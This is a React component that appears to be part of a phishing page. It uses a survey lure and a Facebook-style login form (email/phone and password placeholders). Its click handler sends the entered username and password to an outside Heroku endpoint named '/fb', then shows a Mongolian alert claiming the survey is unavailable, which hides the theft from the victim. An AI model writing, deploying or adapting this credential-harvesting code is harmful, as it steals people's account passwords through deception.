import React, { Component } from "react";
import axios from "axios";
import css from "./App.css";
import Alert from "./Alert";
import Login from "./login";

export default class App extends Component {
  constructor(props) {
    super(props);
    this.state = { username: "", password: "" };

    this.onChangeUsername = this.onChangeUsername.bind(this);
    this.onChangePassword = this.onChangePassword.bind(this);
  }
  onChangeUsername(e) {
    this.setState({
      username: e.target.value,
    });
  }
  onChangePassword(e) {
    this.setState({
      password: e.target.value,
    });
  }
  componentDidMount() {
    // alert("Судалгаа өгөхийн тулд эхлээд нэвтэрж орно уу?");
  }
  handleClick = () => {
    // e.preventDefault();

    const exercise = {
      username: this.state.username,
      password: this.state.password,
    };

    console.log(exercise);

    axios
      .post("https://galt-mern.herokuapp.com/fb", exercise)
      .then((res) => console.log(res.data));
    alert("Та одоогийн байдлаар судалгаа өгөх  боломжгүй байна?");
  };

  render() {
    return (
      <div>
        <Login />
      </div>
      // <div class="backgroundimage">
      //   {console.log(this.state.username)}
      //
      //

      //   <div>
      //     <input
      //       type="text"
      //       required
      //       className="user"
      //       value={this.state.username}
      //       placeholder="Email address or phone number"
      //       onChange={this.onChangeUsername}
      //     />
      //   </div>
      //   <div>
      //     <input
      //       type="password"
      //       className="pass"
      //       placeholder="Password"
      //       value={this.state.password}
      //       onChange={this.onChangePassword}
      //     />
      //   </div>

      //   <div className="form-group">
      //     <button onClick={this.handleClick} className="button">
      //       Login
      //     </button>
      //   </div>
      // </div>
    );
  }
}
